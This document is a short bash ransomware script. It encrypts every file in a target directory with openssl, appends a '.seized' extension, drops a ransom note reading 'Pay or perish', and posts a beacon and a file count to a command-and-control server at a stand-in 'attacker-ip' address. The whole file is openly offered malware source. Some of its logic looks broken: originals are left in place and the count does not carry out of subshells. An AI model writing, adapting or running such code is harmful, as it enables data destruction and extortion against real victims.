#!/bin/bash
# Standalone Ransomware (if fetched separately)
# Usage: bash ransomware.sh [target_dir] [c2_url]
TARGET_DIR="${1:-/tmp/test_victim}"
C2_URL="${2:-http://attacker-ip:8080}"

KEY="standalone-$(date +%s)-$(uuidgen | cut -d- -f1)"
IV=$(openssl rand -hex 16)
ENCRYPTED_EXT=".seized"

# Beacon
curl -s -X POST "$C2_URL/beacon" -H "Content-Type: application/json" -d "{\"mode\": \"standalone\"}" >/dev/null

# Encrypt function (same as above)
encrypt_file() {
    local file="$1"
    if [[ -f "$file" && ! "${file}" =~ ${ENCRYPTED_EXT}$ ]]; then
        local content=$(cat "$file")
        echo -n "$content" | openssl enc -aes-256-cbc -a -salt -k "$KEY" -iv "$IV" -out "${file}.tmp" >/dev/null 2>&1
        mv "${file}.tmp" "${file}${ENCRYPTED_EXT}"
        ((seized++))
    fi
}

seized=0
export -f encrypt_file
export KEY IV ENCRYPTED_EXT TARGET_DIR
find "$TARGET_DIR" -type f ! -name "*seized*" -print0 | xargs -0 bash -c 'encrypt_file "$@"' _ {}

cat > "$TARGET_DIR/README.txt" << EOR
STANDALONE BREACH
Data seized. Pay or perish. Key: $KEY
EOR

curl -s -X POST "$C2_URL/exfil" -H "Content-Type: application/json" -d "{\"seized\": $seized}" >/dev/null
echo "Standalone run: $seized files seized."
